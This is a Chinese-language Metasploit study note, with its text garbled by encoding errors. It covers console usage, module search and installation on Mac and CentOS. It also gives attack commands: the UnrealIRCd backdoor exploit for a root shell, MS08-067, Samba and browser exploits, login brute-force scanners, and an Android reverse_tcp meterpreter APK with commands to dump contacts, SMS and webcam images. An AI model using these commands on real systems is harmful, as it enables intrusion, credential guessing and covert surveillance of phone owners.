â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸
ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ MSF ç®€ä»‹ ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ
â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸

ğŸ”¸ å‚è€ƒ

â˜…â˜…â˜…â˜…â˜… EN https://null-byte.wonderhowto.com/how-to/metasploit-basics/
â˜…â˜…â˜…â˜…â˜… CN https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/31.html


â˜…â˜…â˜…â˜… Kali Linux ç§˜ç± ç¬¬äº”ç«  æ¼æ´è¯„ä¼°
        https://segmentfault.com/a/1190000007067065





ğŸ”¸ Metasploit:

    æ¼æ´æ£€æµ‹å’Œåˆ©ç”¨å·¥å…·.ç®€ç§° MSF. 
    éå¸¸å®¹æ˜“ä½¿ç”¨. æœ€å…ˆè¿›çš„è¿›æ”»æ­¦å™¨.å…è´¹.å¸¦æœ‰å¤§é‡æ”»å‡»å·¥å…·..
    Kali è‡ªå¸¦MSF, æ‰‹åŠ¨å®‰è£…MSFéå¸¸éº»çƒ¦.è™šæ‹Ÿæœºå®‰è£…ä¸ªKali æ˜¯æœ€ç®€å•æœ€å¿«çš„.   
    Mac/Linux å¯ä»¥æ‰‹åŠ¨å®‰è£…, å®‰è£…å¥½åç”¨msfconsole å‘½ä»¤è¿›å…¥msfäº¤äº’ç•Œé¢


ğŸ”¸ Armitage:

    æ˜¯Metasploitæ¡†æ¶ä¸­ä¸€ä¸ªå®Œå…¨äº¤äº’å¼çš„å›¾å½¢åŒ–ç”¨æˆ·æ¥å£ï¼Œ
    æ”¯æŒMac é…ç½®éº»çƒ¦.http://www.fastandeasyhacking.com/download/
    å®‰è£…ç®€è¶…çº§å•: brew cask install armitage 
    armitage æ˜¯ä¸ª C/Sæ¶æ„. Metasploit is the server and Armitage is the client.
    armitage é€šè¿‡ç•Œé¢æ¥æ§åˆ¶ Metasploitå°±è¿™ä¹ˆç®€å•


ğŸ”¸ æ¼æ´æ‰«æå™¨:

        æŸ¥æ‰¾åº”ç”¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿä¸­è½¯ä»¶çš„å¼±ç‚¹.
        æ¯ä¸ªæ‰«æå™¨éƒ½æœ‰è‡ªå·±çš„å—…æ¢æ–¹æ³•.ä½†æ˜¯ç»“æœéƒ½æ˜¯: æŠ¥å‘Šæ‰€å‘ç°çš„é—®é¢˜.

        æ‰«æåˆ†å¾ˆå¤šæ­¥çš„.
          é¦–å…ˆæ‰«æ æŸåŒºåŸŸå†…çš„ æ´»åŠ¨ä¸»æœº. å’Œ ip.
          æ‰«æå‡ºå¼€å‘çš„ç«¯å£. å¼€å‘çš„æœåŠ¡.
          é’ˆå¯¹æŸä¸ªç«¯å£. å’ŒæŸä¸ªæœåŠ¡.


ğŸ”¸ Metasploit å·¥ä½œæµç¨‹
    é€‰æ‹© å¹¶é…ç½®ç›®æ ‡.  
    éªŒè¯é’ˆå¯¹ç³»ç»Ÿçš„æ”»å‡».
    é€‰æ‹©ä¸€ä¸ªè¦ä½¿ç”¨çš„ æœ‰æ•ˆè´Ÿè½½.
    æœ‰æ•ˆè´Ÿè½½: æ‰«æå™¨å‘ç°ç³»ç»Ÿå…¥ä¾µç‚¹å å°†åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„ä»£ç .
    æ‰§è¡Œæ”»å‡»..




â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸
ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ    ä½¿ç”¨  ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ
â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸

ğŸ”¸ ç®€ä»‹
    MSFCONSOLEç”¨äºç®¡ç†ç”¨æˆ·çš„ä¼šè¯ï¼Œè€ŒMeterpreteråˆ™æ˜¯æ”»å‡»è½½è·å’Œæ¸—é€æ”»å‡»äº¤äº’

    ğŸ”… msfconsole
    ğŸ”… search linux
    ğŸ”… use auxiliary/analyze/jtr_linux
    ğŸ”… show options
    ä»è¾“å‡ºç»“æœä¸­å¯ä»¥çœ‹åˆ°jtr_linuxæ¨¡å—æœ‰5ä¸ªæœ‰æ•ˆçš„é€‰é¡¹ï¼Œ
    å¦‚Cryptã€JOHN_BASEã€JOHE_PATHã€Mungeå’ŒWordlistã€‚åœ¨è¾“å‡ºçš„ä¿¡æ¯ä¸­ï¼Œå¯¹è¿™5ä¸ªé€‰é¡¹åˆ†åˆ«æœ‰è¯¦ç»†çš„æè¿°ã€‚


    ğŸ”… set JOHN_PATH /usr/share/metasploit-framework/data/wordlists/password.lst
    ğŸ”… exploit


    Mac php7 æ¼æ´ æœ€æ–°ç‰ˆæœ¬æ˜¯ php7.0.16 .


ğŸ”µ msf å…¥é—¨

    ğŸ”… use exploit/unix/irc/unreal_ircd_3281_backdoor
    ğŸ”… set rhost 192.168.169.139
    ğŸ”… exploit

    è¿™é‡Œå°±æ‹¿åˆ°äº†å¯¹æ–¹çš„shell. è€Œä¸”æ˜¯rootæƒé™çš„!!  è¾“å…¥ whoami å¯ä»¥çœ‹åˆ°æ˜¯ root æƒé™çš„

    Metasploit æ‹¥æœ‰msfpayload å’Œmsfencode è¿™ä¸¤ä¸ªå·¥å…·ï¼Œè¿™ä¸¤ä¸ªå·¥å…·ä¸ä½†å¯ä»¥ç”Ÿæˆexe å‹åé—¨ï¼Œä¸€å¯ä»¥ç”Ÿæˆç½‘é¡µè„šæœ¬ç±»å‹çš„webshell ï¼Œé€šè¿‡ç”Ÿæˆwebshell ç„¶åè®¾ç½®ç›‘å¬å™¨ï¼Œè®¿é—®webshellçš„urlï¼Œå¹¸è¿çš„è¯å¯ä»¥äº§ç”Ÿä¸€ä¸ªsessionï¼Œä»¥ä¾¿è¿›ä¸€æ­¥åˆ©ç”¨


    http://23.105.192.96/phpinfo.php

    æ“ä½œç³»ç»Ÿæ¸—é€.





ç™»å½•ä¿¡æ¯:
+ -- --=[ 1639 exploits - 943 auxiliary - 288 post        ]
+ -- --=[ 472 payloads - 40 encoders - 9 nops             ]
    exploits  æ”»å‡»..
    payload  æ¨¡å—

    å…ˆé€‰æ‹©ä¸€ä¸ªæ¨¡å—. ç„¶åé…ç½®è¿™ä¸ªæ¨¡å—. æ”»å‡».

    æŸ¥æ‰¾æ¨¡å—: search 
    ä½¿ç”¨æ¨¡å—: use
    æ¨¡å—ç”¨æ³•: show options
    é…ç½®æ¨¡å—: set
    exploit


ğŸ”¸ æŸ¥çœ‹å¸®åŠ©  help  
ğŸ”¸ æ•°æ®åº“è¿æ¥æƒ…å†µ:  db_status
ğŸ”¸ è¿è¡Œnmapæ‰«æ:   db_nmap 23.105.192.96

ğŸ”¸ æœç´¢æ¨¡å—: search          search ms12_020
ğŸ”¸ ä½¿ç”¨æ¨¡å—:  use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    ğŸ”¸ æ¨¡å—ä¿¡æ¯: info
    ğŸ”¸ æŸ¥çœ‹å¯ç”¨ payload:   show payloads
 
    ğŸ”¸ å½“å‰exploitå¯é€‰è®¾ç½®: show options
        rhost == remote host ==è¿œç¨‹ä¸»æœº   
        rport==remote port ==è¿œç¨‹ç«¯å£ 
        ğŸ”¸ set RHOST 192.168.181.147    è®¾ç½®è¦æ”»å‡»çš„ipä¸º192.168.181.147
        ğŸ”¸ exploit                      å¼€æœºæ”»å‡»



jobs  
    jboså¯ä»¥æŸ¥çœ‹msfconsoleä¸Šå­˜åœ¨å“ªäº›ä»»åŠ¡ï¼Œjbos -k idå·ç   å¯ä»¥ç»ˆæ­¢æŸä¸€ä¸ªä»»åŠ¡

connect 
    æµ‹è¯•: å¦‚ connect 23.105.192.96 3306

search platform
    æœ‰æ—¶å€™æˆ‘ä»¬ä¼šæœç´¢åˆ°å¤§é‡çš„æ¨¡å—ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨platformï¼šå‘½ä»¤æ¥ç¼©å°æŸ¥è¯¢èŒƒå›´ã€‚
    ä½¿ç”¨platformå‘½ä»¤åï¼Œæ‰€æŸ¥è¯¢çš„ç»“æœä¼šåˆ—å‡ºrankæ¯”è¾ƒé«˜çš„æ¨¡å—ã€‚
    å¦‚æœæˆ‘è¦æŸ¥æ‰¾mysqlçš„æ¼æ´ï¼Œé‚£ä¹ˆè¾“å…¥ â€œsearch platformï¼šmysqlâ€ã€‚æ‰€æœ‰rankä¸ºnormalçš„æ¨¡å—å…¨éƒ¨éƒ½å±è”½äº†ï¼Œ
    åªå‰©ä¸‹å‡ ä¸ªæ¯”è¾ƒé«˜çº§çš„åˆ©ç”¨æ¨¡å—





  è¾“å…¥show å°±å¯ä»¥æŸ¥çœ‹ æ‰€æœ‰çš„ æ¨¡å—..

  payload å¯ä»¥åˆ†æˆ8å¤§ç±».
    inline  
    staged 
    Meterpreter
    PassiveX
    NoNX
    Ord
    IPv6
    Reflective DLL Injection




ğŸ”¸ æ”»å‡»æµç¨‹
    use ä½¿ç”¨ä¸€ä¸ªæ”»å‡».
    show æ˜¾ç¤ºä¸Šä¸‹æ–‡
    info æŸ¥çœ‹æŸæ¨¡å—çš„ç»†èŠ‚.
    é…ç½®è¿™ä¸ªæ”»å‡»

Meterpreter

MSFCONSOLEç”¨äºç®¡ç†ç”¨æˆ·çš„ä¼šè¯ï¼Œè€ŒMeterpreteråˆ™æ˜¯æ”»å‡»è½½è·å’Œæ¸—é€æ”»å‡»äº¤äº’ã€‚






ğŸ”¸ msf > show encoders                          æ˜¾ç¤ºç¼–ç å™¨
ğŸ”¸ msf > search type:exploit                    æœç´¢.  ç§ç±»:æ¢ç´¢
ğŸ”¸ msf > search type:exploit platform:solaris   æœç´¢ solaris å¹³å°ä¸‹çš„ æ¢ç´¢å·¥å…·..

Metasploit Keywords
å…³é”®è¯.



ğŸ”µ show
help
info
set
back
use
exploit
session
exit




msf > nmap -v -sV some_host

msf > db_nmap -v -sV some_host    âœ  è¿™ä¸ªç»“æœä¼šè¾“å‡ºåˆ° æ•°æ®åº“!!!!
msf > hosts                       âœ  åˆ—å‡ºdb_nmap æ‰¾åˆ°çš„ä¸»æœº
msf > hosts -R                    âœ  æŠŠæ‰¾åˆ°çš„ä¸»æœº åŠ å…¥åˆ°ç›®æ ‡ä¸»æœº.


æ›´å¤šå·¥å…·:
search portscan



ğŸ”µ æœç´¢æ¼æ´
    msf > search CVE-xxxx-xxx
    msf > search name:mysql
    msf > search windows type:exploit


ğŸ”µ ä½¿ç”¨æ¼æ´
    msf > use exploit/path/to/exploit_name


ğŸ”µ è®¾ç½®payloadï¼š
    msf > show payloads
    msf > set payload path/to/payload


ğŸ”µ å…¥ä¾µï¼š
    msf > exploit




ğŸ”µ ssh
use auxiliary/scanner/ssh/ssh_version

sshæœåŠ¡å£ä»¤çŒœæµ‹
use auxiliary/scanner/ssh/ssh_login






ğŸ”µ oracleæ•°æ®åº“æœåŠ¡æ‰«æ
use auxiliary/scanner/oracle/tnslsnr_version





ğŸ”µ mysqlæ”»å‡»
use auxiliary/scanner/mysql/mysql_login



ğŸ”µ postgresqlæ”»å‡»
use auxiliary/scanner/postgres/postgres_login


ğŸ”µ tomcat æ”»å‡»
use auxiliary/scanner/http/tomcat_mgr_login




ğŸ”µ telnet æ”»å‡»
use auxiliary/scanner/telnet/telnet_version



ğŸ”µ sambaæ”»å‡»
use auxiliary/scanner/smb/smb_version

search ms08_067
use exploit/windows/smb/ms08_067_netapi

SAMBAæ¸—é€æ”»å‡»

search chain_reply
use exploit/linux/samba/chain_reply



ğŸ”µ æµè§ˆå™¨æ¸—é€æ”»å‡»å®ä¾‹
ms11-050
use windows/browser/ms11_050_mshtml_cobjectelemnt





ğŸ”µ å…¥ä¾µå®‰å“æ‰‹æœº

msfpayload android/meterpreter/reverse_tcp LHOST=172.16.1.109 LPORT=4444 R > /root/Desktop/apk.apk
use exploit/mutli/handler
set payload android/meterpreter/reverse_tcp
set LHOST 172.16.1.109
exploit
dump_contacts â€“è¿™ä¸ªæ˜¯å¯¼å‡ºç”µè¯dump_sms â€“è¿™ä¸ªæ˜¯å¯¼å‡ºä¿¡æ¯
Webcam_listå¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªæ‘„åƒå¤´
-i 1 æ˜¯é€‰æ‹©åæ‘„åƒå¤´
webcam_snap æ˜¯æ‹ç…§ ï¼Œçœ‹åˆ°æˆ‘ç”µè„‘äº†
webcam_stream å¼€å¯æ‘„åƒå¤´









â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸
ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ  å®æˆ˜        ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ
â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸

Mac æœ¬æœºç”¨ nessus æ‰«æå‡ºä¸¤ä¸ªè‡´å‘½æ¼æ´. ä¸€ä¸ªæ˜¯ xcode ç‰ˆæœ¬è¿‡ä½.

å®˜æ–¹æ¼æ´ä¿¡æ¯..
https://lists.apple.com/archives/security-announce/2016/Oct/msg00005.html















â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸
ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ  MSF Mac å®‰è£…  ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ
â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸

ğŸ”¸ä¾èµ–ç¯å¢ƒ: homebrewã€rubyã€rbenv ã€postgresql

    bomebrew å®‰è£…è½¯ä»¶çš„.
    rbenv  ç®¡ç†rubyç‰ˆæœ¬çš„.
    ğŸ”… brew install rbenv ruby-build rbenv-default-gems rbenv-gem-rehash rbenv-vars

    å®‰è£… Postgresql https://www.enterprisedb.com/downloads/postgres-postgresql-downloads#macosx
    é»˜è®¤å¸å·:  postgres  å¯†ç  root
    ç«¯å£: 5432

ğŸ”¸ metasploit ä¸»ç¨‹åºå®‰è£…

    å®‰è£…æ•™ç¨‹ https://null-byte.wonderhowto.com/how-to/mac-for-hackers-install-metasploit-framework-0174517/

    ğŸ”¸ ä¸‹è½½ pkg å®‰è£…åŒ….
    å®‰è£…å¥½pkgæ²¡æœ‰ç»“æŸ.!!!

    ğŸ”… cd /opt/metasploit-framework/bin/
    ğŸ”… ./msfconsole
    ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯ æŠŠ... åŠ å…¥ç¯å¢ƒè·¯å¾„. é€‰æ‹©yes. ä¹‹ååœ¨ä»»æ„ç›®å½•éƒ½å¯ä»¥æ”¯æŒ msf å‘½ä»¤äº†.
    è¾“å…¥ yes .

    ç¬¬äºŒä¸ªé—®é¢˜: æ–°å»ºä¸€ä¸ªæ•°æ®åº“..
    æ•°æ®åº“ å¯ä»¥ åˆ—å‡ºä¸»æœº. ç­‰ç­‰ä¸€ç³»åˆ—ä¿¡æ¯. yes 
    Installing the database will allow us to list credentials, list hosts, and moreâ€”which is what we want.

    å®‰è£…å¥½å°± è‡ªåŠ¨ è¿›å…¥ msf å‘½ä»¤ç•Œé¢äº†.
    å®‰è£…å°±ç®—å®Œæˆäº†.

    ç°åœ¨æ£€æŸ¥ä¸‹ æ•°æ®åº“æ˜¯å¦æ­£å¸¸:
    msf > db_status
    [*] postgresql connected to msf


ğŸ”¸ æ›´æ–° Metasploit
    msf ç•Œé¢é‡Œé¢ è¾“å…¥ msfupdate å°±å¯ä»¥æ›´æ–°äº†. æ›´æ–°æ¼æ´å¾ˆé‡è¦å•Š...
    

ğŸ”¸ è¿è¡Œ:msfconsole
        ç¯å¢ƒå˜é‡ä¸å¤Ÿç”¨ é‚£å°±è‡ªå·±åŠ ...ä¹‹åä»»æ„ç›®å½• è¾“å…¥ msfconsole éƒ½å¯ä»¥è¿›å…¥äº†.


ğŸ”¸ é…ç½® postsqlæ•°æ®åº“.
    è¿™é‡Œç”¨ navicat æ–°å»ºä¸€ä¸ªquery ç„¶åç²˜ä¸‹é¢çš„å°±å¥½äº†...
    CREATE USER msf WITH PASSWORD 'msf';
    CREATE DATABASE msf OWNER msf;
    GRANT ALL PRIVILEGES ON DATABASE msf to msf;









â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸
ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ Centos6 å®‰è£… ğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µğŸ”µ
â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸------â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸â¬›ï¸

ğŸ”¸ MSF ä¾èµ–:
    yum groupinstall 'Development Tools'
    yum install sqlite-devel libxslt-devel libxml2-devel java-1.7.0-openjdk libpcap-devel nano openssl-devel zlib-devel libffi-devel gdbm-devel readline-devel nano wget


ğŸ”¸ ruby å®‰è£…

    â¦¿ å®‰è£…yaml:(rubyä¾èµ–)
        cd /usr/src && wget http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz
        tar zxvf yaml-0.1.6.tar.gz && cd yaml-0.1.6
        ./configure --prefix=/usr/local && make && make install


    â¦¿ å®‰è£…ruby
        cd /usr/src && wget http://ftp.ruby-lang.org/pub/ruby/2.2/ruby-2.2.1.tar.gz
        tar zxvf ruby-2.2.1.tar.gz && cd ruby-2.2.1
        ./configure --prefix=/usr/local --with-opt-dir=/usr/local/lib
        make && make install


ğŸ”¸ å®‰è£… Nmap
    cd /usr/src  svn co https://svn.nmap.org/nmap
    cd nmap && ./configure && make && make install && make clean



ğŸ”¸ å®‰è£… Postgresql

    exclude=postgresql*
    wget https://download.postgresql.org/pub/repos/yum/9.4/redhat/rhel-6-i386/pgdg-centos94-9.4-3.noarch.rpm

    rpm -ivh pgdg-centos94-9.4-3.noarch.rpm

    yum update -y && yum install postgresql94-server postgresql94-devel postgresql94 -y


        ç°åœ¨å¼€å§‹åˆå§‹åŒ–æœåŠ¡å™¨å¹¶å°†å…¶é…ç½®ä¸ºè‡ªåŠ¨å¯åŠ¨ï¼Œå‘½ä»¤å¦‚ä¸‹
        service postgresql-9.4 initdb
        service postgresql-9.4 start
        chkconfig postgresql-9.4 on

    â¦¿ é…ç½®ç¯å¢ƒè·¯å¾„

        å› ä¸ºç¼–è¯‘rubyæ‰€å¿…é¡»çš„gemæ—¶ï¼Œéœ€è¦æŠŠæ–°å®‰è£…çš„åŠ å…¥è·¯å¾„ï¼Œè¿™æ ·ç¼–è¯‘å™¨å°±èƒ½æ‰¾åˆ°åº“å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥éœ€è¦æ‰§è¡Œå‡ ä¸ªå‘½ä»¤ï¼š

        echo export PATH=/usr/pgsql-9.4/bin:\$PATH >> /etc/bashrc
            // å¦‚æœä½ ç”¨çš„æ˜¯zsh å°±ä¿®æ”¹ .zhsrc
            // æ·»åŠ è¿™è¡Œå†…å®¹è¿›å»å°±å¯ä»¥  export PATH=/usr/pgsql-9.4/bin:$PATH
        source ~/.bashrc
            // è¿™ä¸ªæ˜¯é‡æ–°åŠ è½½ bashçš„æ„æ€. 
            // source ~/.zshrc


    â¦¿ åˆ‡æ¢åˆ°Postgresqlç”¨æˆ·ï¼Œ
        è¿™æ ·å°±å¯ä»¥åˆ›å»ºæˆ‘ä»¬å°†è¦ç”¨äºMetasploitçš„ç”¨æˆ·åå’Œæ•°æ®åº“äº†ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š

        su - postgres


        ç°åœ¨å¼€å§‹åˆ›å»ºç”¨æˆ·å’Œæ•°æ®åº“,è¿™äº›éƒ½å°†åœ¨database.ymlä¸­ä½¿ç”¨åˆ°ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š
        createuser msf -P -S -R -D     // è®°ä½è‡ªå·±çš„çš„å¯†ç . æˆ‘æ˜¯ xujian
        createdb -O msf msf
        exit


        ä¸ºäº†å…è®¸æˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·èƒ½å¤Ÿè¿æ¥Postgresqlï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®ä¸€ä¸‹pg_hba.confæ–‡ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š
            vi /var/lib/pgsql/9.4/data/pg_hba.conf

            local msf msf md5
            hostmsf msf 127.0.0.1/8 md5
            hostmsf msf ::1/128 md5


            è®¾ç½®å¥½äº†ä¹‹åï¼Œé‡å¯æœåŠ¡ï¼š
            service postgresql-9.4 restart
            è¿™é‡Œä½ è®¾ç½®ä¸å¯¹ å°±ä¼šå¯åŠ¨ä¸äº†!!!
            æˆ‘æˆ‘ä»¬å°±ä¸è¯¥.
            ä¸å°±æ˜¯è¿æ¥æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“ä¹ˆ.
            navicast å¯ä»¥é€šè¿‡ssh å…ˆç™»å½•åˆ°æœåŠ¡å™¨. å†è¿æ¥åˆ°æ•°æ®åº“.
            è¿™æ ·å°±ä¸ç”¨è¯¥è¿™ä¸ªè®¾ç½®äº†..





ğŸ”¸ å®‰è£…Metasploitæ¡†æ¶.
    æˆ‘ä»¬éœ€è¦å†å®‰è£…ä¸€äº›Metasploitä¾èµ–çš„Rubyåº“ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š
    gem install wirble pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler


ğŸ”¸ ä½¿ç”¨Gitä¸‹è½½æœ€æ–°çš„Metasploitï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š
    cd /opt
    git clone https://github.com/rapid7/metasploit-framework.git
    cd metasploit-framework



ğŸ”¸ ä¸ºäº†åœ¨ç»ˆç«¯ä¸‹ä¹Ÿèƒ½è¿è¡Œï¼Œè¿™æ ·å°±ä¸ä»…ä»…åªåœ¨Metasploitçš„æ–‡ä»¶ä¸­è¿è¡Œã€‚æˆ‘ä»¬éœ€è¦åˆ›å»ºè½¯é“¾æ¥ã€‚

    bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
    ln -s /opt/metasploit-framework/armitage /usr/local/bin/armitage


ğŸ”¸ åœ¨ç»ˆç«¯ä¸‹ï¼Œè¿›å…¥Metasploitçš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨Bundler Gemæ¥å®‰è£…åˆé€‚çš„Gemç‰ˆæœ¬ï¼š
    bundle install


ğŸ”¸ åˆ›å»ºMetasploitæ¡†æ¶å°†è¦ä½¿ç”¨çš„database.ymlï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š

    vi /opt/metasploit-framework/database.yml
        database.ymlä¸­çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š
            production:
            adapter: postgresql
            database: msf
            username: msf
            password: 
            host: 127.0.0.1
            port: 5432
            pool: 75
            timeout: 5



        å†æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¿™æ ·å°±èƒ½é€šè¿‡Armitageå’Œmsfconsoleåœ¨å½“å‰shellä¸­åˆ›å»ºå’ŒåŠ è½½ç¯å¢ƒå˜é‡ï¼š

